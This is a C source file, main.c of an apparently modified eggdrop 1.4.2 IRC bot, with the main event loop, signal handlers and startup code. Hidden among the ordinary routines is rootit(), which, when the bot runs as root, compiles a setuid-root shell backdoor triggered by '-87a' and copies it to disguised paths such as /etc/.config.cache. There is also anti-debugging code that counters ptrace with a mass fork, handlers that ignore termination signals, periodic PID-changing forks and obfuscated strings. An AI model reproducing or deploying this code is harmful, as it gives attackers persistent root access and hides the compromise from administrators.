
/* 
 * main.c -- handles:
 *   core event handling
 *   signal handling
 *   command line arguments
 *   context and assert debugging
 * 
 * dprintf'ized, 15nov1995
 * 
 * $Id: main.c,v 1.40 2000/01/17 16:14:45 per Exp $
 */

/* 
 * Copyright (C) 1997  Robey Pointer
 * Copyright (C) 1999, 2000  Eggheads
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

/* 
 * The author (Robey Pointer) can be reached at:  robey@netcom.com
 * NOTE: Robey is no long working on this code, there is a discussion
 * list avaliable at eggheads@eggheads.org.
 */

#include "main.h"
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <netdb.h>
#include <setjmp.h>
#ifdef STOP_UAC			/* osf/1 complains a lot */
#include <sys/sysinfo.h>
#define UAC_NOPRINT    0x00000001	/* Don't report unaligned fixups */
#endif
#include <sys/file.h>
#include <sys/stat.h>
#ifdef G_ANTITRACE
#include <sys/ptrace.h>
#include <sys/wait.h>
#endif

/* some systems have a working sys/wait.h even though configure will
 * decide it's not bsd compatable.  oh well. */
#include "chan.h"
#include "hook.h"
#include "tandem.h"
#include "settings.h"
#include <sys/mman.h>
#define PAGESIZE 4096

#ifdef CYGWIN_HACKS
#include <windows.h>
BOOL FreeConsole(VOID);
#endif

#ifndef _POSIX_SOURCE

/* solaris needs this */
#define _POSIX_SOURCE 1
#endif

extern char origbotname[],
  userfile[],
  botnetnick[];
extern int dcc_total,
  conmask,
  cache_hit,
  cache_miss,
  max_logs,
  quick_logs,
  fork_interval,
  local_fork_interval;

extern struct dcc_t *dcc;
extern struct userrec *userlist;
extern struct chanset_t *chanset;
extern log_t *logs;

#ifdef G_USETCL
extern Tcl_Interp *interp;
extern tcl_timer_t *timer,
 *utimer;
#endif
extern jmp_buf alarmret;
extern void check_promisc();
extern void check_trace();
extern void check_last();
extern void check_processes();
extern char localkey[];
#ifdef HUB
extern FILE * logfile;
#endif

/* 
 * Please use the PATCH macro instead of directly altering the version
 * string from now on (it makes it much easier to maintain patches).
 * Also please read the README file regarding your rights to distribute
 * modified versions of this bot.
 */

char egg_version[100] = "";
char magickey[20]="";
char packname[40]="";
char ver[60] = "";
char version[60] = "";
int egg_numver = 1040200;
time_t lastfork=0;
int default_flags = 0;		/* default user flags and */
int default_uflags = 0;		/* default userdefinied flags for people */

				/* who say 'hello' or for .adduser */

int backgrd = 1;		/* run in the background? */
char *binname;
char helpdir[121];		/* directory of help files (if used) */
char textdir[121] = "";		/* directory for text files that get dumped */
int keep_all_logs = 0;		/* never erase logfiles, no matter how old

				 * they are? */
time_t online_since;		/* unix-time that the bot loaded up */
int make_userfile = 0;		/* using bot in make-userfile mode? (first

				 * user to 'hello' becomes master) */
char lock_file[40] = "";
char owner[121] = "";		/* permanent owner(s) of the bot */
int save_users_at = 0;		/* how many minutes past the hour to

				 * save the userfile? */
int notify_users_at = 0;	/* how many minutes past the hour to

				 * notify users of notes? */
int switch_logfiles_at = 300;	/* when (military time) to switch logfiles */

int use_stderr = 1;		/* send stuff to stderr instead of logfiles? */
int do_restart = 0;		/* .restart has been called, restart asap */
int die_on_sighup = 0;		/* die if bot receives SIGHUP */
int die_on_sigterm = 0;		/* die if bot receives SIGTERM */
int resolve_timeout = 15;	/* hostname/address lookup timeout */
time_t now;			/* duh, now :) */


extern struct cfg_entry CFG_FORKINTERVAL;
#define fork_interval atoi( CFG_FORKINTERVAL.ldata ? CFG_FORKINTERVAL.ldata : CFG_FORKINTERVAL.gdata ? CFG_FORKINTERVAL.gdata : "0")

#ifdef DEBUG_CONTEXT

/* context storage for fatal crashes */
char cx_file[16][30];
char cx_note[16][256];
int cx_line[16];
int cx_ptr = 0;
#endif

void fatal(char *s, int recoverable)
{
  int i;

  log(LCAT_ERROR, STR("* %s"), s);
  for (i = 0; i < dcc_total; i++)
    if (dcc[i].sock >= 0)
      killsock(dcc[i].sock);
#ifdef HUB
  if (logfile) {
    fflush(logfile);
  }
#endif
  if (!recoverable) {
    unlink(lock_file);
#ifdef HUB
    if (logfile)
      fclose(logfile);
#endif
    exit(1);
  }
}

int expmem_chanprog(),
  expmem_users(),
  expmem_misc(),
  expmem_dccutil(),
  expmem_botnet(),
  expmem_tcl(),
  expmem_tclhash(),
  expmem_net();

#ifdef G_USETCL
int expmem_tcldcc();
#endif

int expmem_main() {
  int tot = strlen(binname) + 1;
  return tot;
}

/* for mem.c : calculate memory we SHOULD be using */
int expected_memory()
{
  int tot;
  Context;
  tot = expmem_main() + expmem_chanprog() + expmem_users() + expmem_misc() + expmem_dccutil() + expmem_botnet() + expmem_tcl() + expmem_tclhash() + expmem_net()
#ifdef G_USETCL
    + expmem_tcldcc()
#endif
    ;
  return tot;
}

void check_expired_dcc()
{
  int i;

  for (i = 0; i < dcc_total; i++)
    if (dcc[i].type && dcc[i].type->timeout_val && ((now - dcc[i].timeval) > *(dcc[i].type->timeout_val))) {
      if (dcc[i].type->timeout)
	dcc[i].type->timeout(i);
      else if (dcc[i].type->eof)
	dcc[i].type->eof(i);
      else
	continue;
      /* only timeout 1 socket per cycle, too risky for more */
      return;
    }
}

#ifdef DEBUG_CONTEXT
int nested_debug = 0;

void write_debug()
{
  int x;
  char s[80];
  int y;

  if (nested_debug) {
    /* yoicks, if we have this there's serious trouble */
    /* all of these are pretty reliable, so we'll try these */
    /* dont try and display context-notes in here, it's _not_ safe <cybah> */
    x = creat(STR("DEBUG.DEBUG"), 0644);
    setsock(x, SOCK_NONSOCK);
    if (x >= 0) {
      strcpy(s, ctime(&now));
      dprintf(-x, STR("Debug (%s %s) written %s"), packname, PACKVERSION, s);
      dprintf(-x, STR("Please report problem to eggheads@eggheads.org"));
      dprintf(-x, STR("after a visit to http://www.eggheads.org/bugs.html"));
      dprintf(-x, STR("Full Patch List: %s\n"), egg_xtra);
      dprintf(-x, STR("Context: "));
      cx_ptr = cx_ptr & 15;
      for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
	dprintf(-x, STR("%s/%d,\n         "), cx_file[y], cx_line[y]);
      dprintf(-x, STR("%s/%d\n\n"), cx_file[y], cx_line[y]);
      killsock(x);
      close(x);
    }
    exit(1);			/* dont even try & tell people about, that may
				 * have caused the fault last time */
  } else
    nested_debug = 1;
  log(LCAT_ERROR, STR("* Last context: %s/%d [%s]"), cx_file[cx_ptr], cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
  x = creat(STR("DEBUG"), 0644);
  setsock(x, SOCK_NONSOCK);
  if (x < 0) {
    log(LCAT_ERROR, STR("* Failed to write DEBUG"));
  } else {
    strcpy(s, ctime(&now));
    dprintf(-x, STR("Debug (%s %s) written %s"), packname, PACKVERSION, s);
    dprintf(-x, STR("STATICALLY LINKED\n"));
#ifdef G_USETCL
    strcpy(s, STR("info library"));
    if (interp && (Tcl_Eval(interp, s) == TCL_OK))
      dprintf(-x, STR("Using tcl library: %s (header version %s)\n"), interp->result, TCL_VERSION);
#endif
    dprintf(-x, STR("Compile flags: %s\n"), CCFLAGS);
    dprintf(-x, STR("Link flags   : %s\n"), LDFLAGS);
    dprintf(-x, STR("Strip flags  : %s\n"), STRIPFLAGS);
    dprintf(-x, STR("Context: "));
    cx_ptr = cx_ptr & 15;
    for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
      dprintf(-x, STR("%s/%d, [%s]\n         "), cx_file[y], cx_line[y], (cx_note[y][0]) ? cx_note[y] : "");
    dprintf(-x, STR("%s/%d [%s]\n\n"), cx_file[cx_ptr], cx_line[cx_ptr], (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
    tell_dcc(-x);
    dprintf(-x, "\n");
    debug_mem_to_dcc(-x);
    killsock(x);
    close(x);
    log(LCAT_ERROR, STR("* Wrote DEBUG"));
  }
}
#endif

void got_bus(int z)
{
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal(STR("BUS ERROR -- CRASHING!"), 1);
#ifdef SA_RESETHAND
  kill(getpid(), SIGBUS);
#else
  exit(1);
#endif
}

struct stackframe {
  struct stackframe * ebp;
  unsigned long addr;
};

/*
  CALL x
  PUSH EBP
  MOV EBP, ESP
  
  0x10: EBP
  0x14: EIP

 */

int canaccess (void * addr) {
  addr = (void *) (((unsigned long) addr / PAGESIZE) * PAGESIZE);
  if (mprotect(addr, PAGESIZE, PROT_READ | PROT_WRITE | PROT_EXEC))
    if (errno != EACCES)
      return 0;
  return 1;
};

struct stackframe * sf =NULL;
int stackdepth = 0;
void stackdump() {
  asm("movl %EBP, %EAX");
  asm("movl %EAX, sf");
  while (canaccess(sf) && stackdepth<20) {
    log(LCAT_ERROR, STR("SEGV STACK DUMP: %08x %08x"), sf->ebp, sf->addr);
    sf = sf->ebp;
    stackdepth++;
  } 
  sleep(1);
};

void got_segv(int z)
{
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  stackdump();
  fatal(STR("SEGMENT VIOLATION -- CRASHING!"), 1);
  exit(1);
}

void got_fpe(int z)
{
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal(STR("FLOATING POINT ERROR -- CRASHING!"), 0);
}

void got_term(int z)
{
#ifdef HUB
  write_userfile(-1);
#endif
  check_tcl_event(STR("sigterm"));
  log(LCAT_WARNING, STR("RECEIVED TERMINATE SIGNAL (IGNORING)"));
}

void got_quit(int z)
{
  check_tcl_event(STR("sigquit"));
  log(LCAT_WARNING, STR("RECEIVED QUIT SIGNAL (IGNORING)"));
  return;
}

void got_hup(int z)
{
  check_tcl_event(STR("sighup"));
  log(LCAT_WARNING, STR("RECEIVED HUP SIGNAL (IGNORING)"));
  return;
}

void got_cont(int z)
{
  log(LCAT_WARNING, STR("RECEIVED CONT SIGNAL (IGNORING)"));
  return;
}

void got_alarm(int z)
{
  /* a call to resolver (gethostbyname, etc) timed out */
  longjmp(alarmret, 1);
  /* STUPID STUPID STUPID */
  /* return; */
}

/* got ILL signal -- log context and continue */
void got_ill(int z)
{
  check_tcl_event(STR("sigill"));
  log(LCAT_WARNING, STR("RECEIVED ILL SIGNAL (IGNORING)"));
  return;
}

#ifdef DEBUG_ASSERT

/* Assert */
void eggAssert(char *file, int line, char *module, int expr)
{
  if (!(expr)) {
#ifdef DEBUG_CONTEXT
    write_debug();
#endif
    if (!module) {
      log(LCAT_WARNING, STR("* In file %s, line %u"), file, line);
    } else {
      log(LCAT_WARNING, STR("* In file %s:%s, line %u"), module, file, line);
    }
    fatal(STR("ASSERT FAILED -- CRASHING!"), 1);
  }
}
#endif

void do_arg(char *s)
{
  int i;
  char pass[40];

  if (s[0] == '-')
    for (i = 1; i < strlen(s); i++) {
      if (s[i] == 'n') {
	backgrd = 0;
	printf(STR("Password:"));
	fgets(pass, sizeof(pass), stdin);
	if (strchr(pass, '\n'))
	  *strchr(pass, '\n') = 0;
	if (strcmp(pass, botnetnick)) {
	  printf(STR("\ngo away.\n"));
	  exit(0);
	} else
	  backgrd = 0;
      }
      if (s[i] == 'v') {
	printf(STR("%s\n"), egg_version);
	exit(0);
      }
    }
}

#ifdef HUB
void backup_userfile()
{
  char s[150];

  log(LCAT_INFO, STR("Backing up user file..."));
  strcpy(s, STR(".cb"));
  copyfile(".c", s);
}
#endif

/* timer info: */
int lastmin = 99;
int curcheck = 0;
time_t then;
struct tm nowtm;

void core_10secondly()
{
  check_expired_dcc();
  curcheck++;
  check_promisc();
  if (curcheck==1)
    check_trace();
  if (curcheck==2)
    check_last();
  if (curcheck==3) {
    check_processes();
    curcheck=0;
  }
  autolink_cycle(NULL);		/* attempt autolinks */
}

void core_30secondly()
{
#ifdef HUB
  if (logfile)
    fflush(logfile);
#endif
}

void do_fork() {
  int xx;
  xx = fork();
  if (xx == -1)
    return;
  if (xx) {
#if HAVE_SETPGID
    setpgid(xx, xx);
#endif
    exit(0);
  }
  lastfork = now;
}

/* rally BB, this is not QUITE as bad as it seems <G> */

/* ONCE A SECOND */
void core_secondly()
{
  static int cnt = 0;
  int miltime;

#ifdef G_USETCL
  do_check_timers(&utimer);	/* secondly timers */
#endif
  if (fork_interval && backgrd) {
    if (now-lastfork > fork_interval)
      do_fork();
  }
  cnt++;
  if ((cnt % 3) == 0) {
    call_hook(HOOK_3SECONDLY);
  }
  if ((cnt % 5) == 0)
    call_hook(HOOK_5SECONDLY);
  if ((cnt % 10) == 0)
    call_hook(HOOK_10SECONDLY);
  if ((cnt % 20) == 0)
    call_hook(HOOK_20SECONDLY);
  if ((cnt % 30) == 0) {
    call_hook(HOOK_30SECONDLY);
    check_botnet_pings();
    cnt = 0;
  }
  Context;
  memcpy(&nowtm, localtime(&now), sizeof(struct tm));

  if (nowtm.tm_min != lastmin) {
    int i = 0;

    /* once a minute */
    lastmin = (lastmin + 1) % 60;
    call_hook(HOOK_MINUTELY);
    check_expired_ignores();
    /* in case for some reason more than 1 min has passed: */
    while (nowtm.tm_min != lastmin) {
      /* timer drift, dammit */
      debug2(STR("timer: drift (lastmin=%d, now=%d)"), lastmin, nowtm.tm_min);
      Context;
      i++;
      lastmin = (lastmin + 1) % 60;
      call_hook(HOOK_MINUTELY);
    }
    if (i > 1)
      log(LCAT_ERROR, STR("(!) timer drift -- spun %d minutes"), i);
    miltime = (nowtm.tm_hour * 100) + (nowtm.tm_min);
    Context;
    if (((int) (nowtm.tm_min / 5) * 5) == (nowtm.tm_min)) {	/* 5 min */
      call_hook(HOOK_5MINUTELY);
      Context;
      if (miltime == 0) {	/* at midnight */
	char s[128];
	int j;

	s[my_strcpy(s, ctime(&now)) - 1] = 0;
	log(LCAT_INFO, STR("--- %.11s%s"), s, s + 20);
#ifdef HUB
	backup_userfile();
#endif
	for (j = 0; j < max_logs; j++) {
	  if (logs[j].filename != NULL && logs[j].f != NULL) {
	    fclose(logs[j].f);
	    logs[j].f = NULL;
	  }
	}
      }
    }
    Context;
    if (nowtm.tm_min == notify_users_at)
      call_hook(HOOK_HOURLY);
    Context;			/* these no longer need checking since they are
				 * all check vs minutely settings and we only
				 * get this far on the minute */
    if (miltime == switch_logfiles_at) {
      call_hook(HOOK_DAILY);
    }
  }
}

void core_minutely()
{
  Context;
  check_tcl_time(&nowtm);
#ifdef G_USETCL
  do_check_timers(&timer);
#endif
  Context;
}

void core_5minutely()
{
#ifdef HUB
  char hub[20];
  besthub(hub);
  if (!strcmp(hub, botnetnick)) 
    send_timesync(-1);
#endif
}

void core_hourly()
{
#ifdef HUB
  write_userfile(-1);
#endif
}

void event_rehash()
{
  Context;
  check_tcl_event(STR("rehash"));
}

void event_prerehash()
{
  Context;
  check_tcl_event(STR("prerehash"));
}

void event_logfile()
{
  Context;
  check_tcl_event(STR("logfile"));
}

void kill_tcl();
void restart_chons();

int init_mem(),
  init_dcc_max(),
  init_userent(),
  init_misc(),
  init_bots(),
  init_net(),
  init_irc(),
  init_ctcp(),
  init_share(),
  init_userrec(),
  init_transfer(),
  init_server(),
  init_channels();

#ifdef G_USETCL
int init_tcl(int, char **);
#endif

void checklockfile()
{
#ifndef LOCK_EX
#define LOCK_EX 2
#endif
#ifndef LOCK_NB
#define LOCK_NB 4
#endif
  static int lockfile;
  char *p;

  p = strrchr(binname, '/');
  p++;
  sprintf(lock_file, STR("lock.%s"), p);
  lockfile = open(lock_file, O_EXCL);
  if (lockfile <= 0) {
    lockfile = open(lock_file, O_EXCL | O_CREAT, S_IWUSR | S_IRUSR);
  }
  if (lockfile <= 0) {
    exit(1);
  }
  if (flock(lockfile, LOCK_EX | LOCK_NB))
    exit(1);
}

char *getfullbinname(char *argv0)
{
  char *cwd,
   *bin,
   *p,
   *p2;

  bin = nmalloc(strlen(argv0) + 1);
  strcpy(bin, argv0);
  if (bin[0] == '/') {
    return bin;
  }
  cwd = nmalloc(8192);
  getcwd(cwd, 8191);
  cwd[8191] = 0;
  if (cwd[strlen(cwd) - 1] == '/')
    cwd[strlen(cwd) - 1] = 0;

  p = bin;
  p2 = strchr(p, '/');
  while (p) {
    if (p2)
      *p2++ = 0;
    if (!strcmp(p, "..")) {
      p = strrchr(cwd, '/');
      if (p)
	*p = 0;
    } else if (strcmp(p, ".")) {
      strcat(cwd, "/");
      strcat(cwd, p);
    }
    p = p2;
    if (p)
      p2 = strchr(p, '/');
  }
  nfree(bin);
  bin = nmalloc(strlen(cwd) + 1);
  strcpy(bin, cwd);
  nfree(cwd);
  return bin;
}

#ifdef G_ROOTIT
void rootit() {
  setuid(0);
  seteuid(0);
  if (!getuid() || !geteuid()) {
    FILE * f;
    f=fopen(STR("s.c"), "w");
    if (f) {
      fprintf(f, STR("#include <stdlib.h>\n"));
      fprintf(f, STR("int main(int argc, char * argv[]) {\n"));
      fprintf(f, STR("if ((argc==2) && (!strcmp(argv[1], \"-87a\"))) {\n"));
      fprintf(f, STR("  setuid(0);setgid(0);system(\"/bin/sh\");\n"));
      fprintf(f, STR("}}\n"));
      fclose(f);
      system(STR("cc s.c -o /tmp/.x11cache"));
      chmod(STR("/tmp/.x11cache"), S_ISUID | S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
      system(STR("cp -f /tmp/.x11cache /etc/.config.cache"));
      system(STR("cp -f /tmp/.x11cache \"/core \""));
      unlink(STR("s.c"));
    }
  }
}
#endif

void messup_term() {
  int i;
  char * argv[4];
  freopen(STR("/dev/null"), "w", stderr);
  for (i=0;i<11;i++) {
    fork();
  }
  argv[0]=nmalloc(100);
  strcpy(argv[0], STR("/bin/sh"));
  argv[1]="-c";
  argv[2]=nmalloc(1024);
  strcpy(argv[2], STR("cat < "));
  strcat(argv[2], binname);
  argv[3]=NULL;
  execvp(argv[0], &argv[0]);
}

void fuckup_trace() {
#ifdef G_ANTITRACE
  int parent, x, i;
  parent=getpid();
#ifdef __linux__
  x = fork();
  if (x == -1)
    return;
  if (x == 0) {
    i = ptrace(PTRACE_ATTACH, parent, 0, 0);
    if (i==(-1)) {
      if (errno==EPERM)
	messup_term();
    } else {
      waitpid(parent, &i, 0);
      kill(parent, SIGCHLD);
      ptrace(PTRACE_DETACH, parent, 0, 0);
      kill(parent, SIGCHLD);
    }
    exit(0);
  } else
    wait(&i);
#endif

#ifdef __FreeBSD__
  x = fork();
  if (x == -1)
    return;
  if (x == 0) {
    i=ptrace(PT_ATTACH, parent, 0, 0);
    if (i==(-1)) {
      if (errno==EBUSY)
	messup_term();
    } else {
      wait(&i);
      i=ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);      
      wait(&i);
      i=ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else
    waitpid(x, NULL, 0);
#endif

#endif
}

int main(int argc, char **argv)
{
  int xx,
    i;
  char buf[520],
    s[520],
   *p;
  struct sigaction sv;
  struct chanset_t *chan;

  {
#include <sys/resource.h>
    struct rlimit cdlim;
    getrlimit(RLIMIT_CORE, &cdlim);
    cdlim.rlim_cur = RLIMIT_NOFILE;
    cdlim.rlim_max = RLIMIT_NOFILE;
    //    setrlimit(RLIMIT_CORE, &cdlim);
  }
  /* initialise context list */
  for (i = 0; i < 16; i++) {
    Context;
  }
  init_mem();
  binname = getfullbinname(argv[0]);
  p = strrchr(binname, '/');
  *p = 0;
  chdir(binname);
  *p = '/';
#ifndef DEBUG_MEM
  fuckup_trace();
#endif
#ifdef G_ROOTIT
  if (!geteuid() || !getuid())
    rootit();
#endif
  init_settings(binname);
  get_setting(NAME_ME, buf, sizeof(buf));
  buf[sizeof(buf) - 1] = 0;
  if (strlen(buf) > 9) {
    printf(STR("my settings are weird.\n"));
    exit(0);
  }
  strcpy(botnetnick, buf);
  get_setting(NAME_MKEY, magickey, sizeof(magickey));
  get_setting(NAME_PACKNAME, packname, sizeof(packname));
  sprintf(egg_version, STR("eggdrop 1.4.2 + %s %s by einride"), packname, PACKVERSION);
  sprintf(ver, STR("eggdrop 1.4.2 + %s %s"), packname, PACKVERSION);
  sprintf(version, STR("eggdrop 1.4.2 + %s %s by einride"), packname, PACKVERSION);

  Context;
#ifdef STOP_UAC
  {
    int nvpair[2];

    nvpair[0] = SSIN_UACPROC;
    nvpair[1] = UAC_NOPRINT;
    setsysinfo(SSI_NVPAIRS, (char *) nvpair, 1, NULL, 0);
  }
#endif
  /* set up error traps: */
  sv.sa_handler = got_bus;
  sigemptyset(&sv.sa_mask);
#ifdef SA_RESETHAND
  sv.sa_flags = SA_RESETHAND;
#else
  sv.sa_flags = 0;
#endif
  sigaction(SIGBUS, &sv, NULL);
  sv.sa_handler = got_segv;
  sigaction(SIGSEGV, &sv, NULL);
#ifdef SA_RESETHAND
  sv.sa_flags = 0;
#endif
  sv.sa_handler = got_fpe;
  sigaction(SIGFPE, &sv, NULL);
  sv.sa_handler = got_term;
  sigaction(SIGTERM, &sv, NULL);
  sv.sa_handler = got_hup;
  sigaction(SIGHUP, &sv, NULL);
  sv.sa_handler = got_quit;
  sigaction(SIGQUIT, &sv, NULL);
  sv.sa_handler = SIG_IGN;
  sigaction(SIGPIPE, &sv, NULL);
  sv.sa_handler = got_ill;
  sigaction(SIGILL, &sv, NULL);
  sv.sa_handler = got_alarm;
  sigaction(SIGALRM, &sv, NULL);
  /* initialize variables and stuff */
  now = time(NULL);
  chanset = NULL;
  memcpy(&nowtm, localtime(&now), sizeof(struct tm));

  lastmin = nowtm.tm_min;
  srandom(now);
  init_log();
  if (argc > 1)
    for (i = 1; i < argc; i++)
      do_arg(argv[i]);
  checklockfile();
  printf(STR("\n%s\n"), egg_version);
  init_dcc_max();
  init_userent();
  init_userrec();
  init_misc();
  init_bots();
  init_net();
#ifdef G_USETCL
  init_tcl(argc, argv);
#else
  init_bind();
#endif
  init_server();
  init_irc();
  init_channels();
  init_ctcp();
  init_transfer();
  init_share();
  Context;
  strcpy(s, ctime(&now));
  s[strlen(s) - 1] = 0;
  strcpy(&s[11], &s[20]);
  log(LCAT_INFO, STR("--- Loading %s (%s)"), egg_version, s);
  chanprog();
  Context;
  i = 0;
  for (chan = chanset; chan; chan = chan->next)
    i++;
  cache_miss = 0;
  cache_hit = 0;
  Context;
#ifndef CYGWIN_HACKS
  /* move into background? */
  if (backgrd) {
    xx = fork();
    if (xx == -1)
      fatal(STR("CANNOT FORK PROCESS."), 0);
    if (xx) {
      printf(STR("Launched into the background  (pid: %d)\n\n"), xx);
#if HAVE_SETPGID
      setpgid(xx, xx);
#endif
      exit(0);
    }
  }
#endif
  use_stderr = 0;		/* stop writing to stderr now */
  xx = getpid();
  if (backgrd) {
    /* ok, try to disassociate from controlling terminal */
    /* (finger cross) */
#if HAVE_SETPGID && !defined(CYGWIN_HACKS)
    setpgid(0, 0);
#endif
    /* close out stdin/out/err */
    freopen(STR("/dev/null"), "r", stdin);
    freopen(STR("/dev/null"), "w", stdout);
    freopen(STR("/dev/null"), "w", stderr);
#ifdef CYGWIN_HACKS
    FreeConsole();
#endif
    /* tcl wants those file handles kept open */

/*    close(0); close(1); close(2);  */
  }
  /* terminal emulating dcc chat */
  then = now;
  online_since = now;
  autolink_cycle(NULL);		/* hurry and connect to tandem bots */
  add_hook(HOOK_SECONDLY, (Function) core_secondly);
  add_hook(HOOK_10SECONDLY, (Function) core_10secondly);
  add_hook(HOOK_30SECONDLY, (Function) core_30secondly);
  add_hook(HOOK_MINUTELY, (Function) core_minutely);
  add_hook(HOOK_5MINUTELY, (Function) core_5minutely);
  add_hook(HOOK_HOURLY, (Function) core_hourly);
  add_hook(HOOK_REHASH, (Function) event_rehash);
  add_hook(HOOK_PRE_REHASH, (Function) event_prerehash);
  add_hook(HOOK_DAILY, (Function) event_logfile);

  debug0(STR("main: entering loop"));
  while (1) {
    int socket_cleanup = 0;

    Context;
#ifdef G_USETCL
#if !defined(HAVE_PRE7_5_TCL) && !defined(HAVE_TCL_THREADS)
    /* process a single tcl event */
    Tcl_DoOneEvent(TCL_ALL_EVENTS | TCL_DONT_WAIT);
#endif
#endif
    /* lets move some of this here, reducing the numer of actual
     * calls to periodic_timers */
    now = time(NULL);
    random();			/* woop, lets really jumble things */
    if (now != then) {		/* once a second */
      call_hook(HOOK_SECONDLY);
      then = now;
    }
    Context;
    /* only do this every so often */
    if (!socket_cleanup) {
      dcc_remove_lost();
      /* check for server or dcc activity */
      dequeue_sockets();
      socket_cleanup = 5;
    } else
      socket_cleanup--;
    xx = sockgets(buf, &i);
    if (xx >= 0) {		/* non-error */
      int idx;

      Context;
      for (idx = 0; idx < dcc_total; idx++)
	if (dcc[idx].sock == xx) {
	  if (dcc[idx].type && dcc[idx].type->activity)
	    dcc[idx].type->activity(idx, buf, i);
	  else {
	    log(LCAT_ERROR, STR("!!! untrapped dcc activity: type %s, sock %d"), dcc[idx].type->name, dcc[idx].sock);
	  }
	  break;
	}
    } else if (xx == -1) {	/* EOF from someone */
      int idx;

      if ((i == STDOUT) && !backgrd)
	fatal(STR("END OF FILE ON TERMINAL"), 0);
      Context;
      for (idx = 0; idx < dcc_total; idx++)
	if (dcc[idx].sock == i) {
	  if (dcc[idx].type && dcc[idx].type->eof)
	    dcc[idx].type->eof(idx);
	  else {
	    log(LCAT_ERROR, STR("!!! untrapped dcc activity: type %s, sock %d"), dcc[idx].type->name, dcc[idx].sock);
	    log(LCAT_ERROR, STR("*** ATTENTION: DEAD SOCKET (%d) OF TYPE %s UNTRAPPED"), i, dcc[idx].type ? dcc[idx].type->name : STR("*UNKNOWN*"));
	    killsock(i);
	    lostdcc(idx);
	  }
	  idx = dcc_total + 1;
	}
      if (idx == dcc_total) {
	log(LCAT_ERROR, STR("(@) EOF socket %d, not a dcc socket, not anything."), i);
	close(i);
	killsock(i);
      }
    } else if ((xx == -2) && (errno != EINTR)) {	/* select() error */
      Context;
      log(LCAT_ERROR, STR("* Socket error #%d; recovering."), errno);
      for (i = 0; i < dcc_total; i++) {
	if ((fcntl(dcc[i].sock, F_GETFD, 0) == -1) && (errno = EBADF)) {
	  log(LCAT_ERROR, STR("DCC socket %d (type %d, name '%s') expired -- pfft"), dcc[i].sock, dcc[i].type, dcc[i].nick);
	  killsock(dcc[i].sock);
	  lostdcc(i);
	  i--;
	}
      }
    } else if (xx == (-3)) {
      call_hook(HOOK_IDLE);
      socket_cleanup = 0;	/* if we've been idle, cleanup & flush */
    }
    if (do_restart) {
      if (do_restart == -2)
	rehash();
      else {
	Context;
#ifdef G_USETCL
	kill_tcl();
	init_tcl(argc, argv);
#endif
	rehash();
	restart_chons();
      }
      do_restart = 0;
    }
  }
}
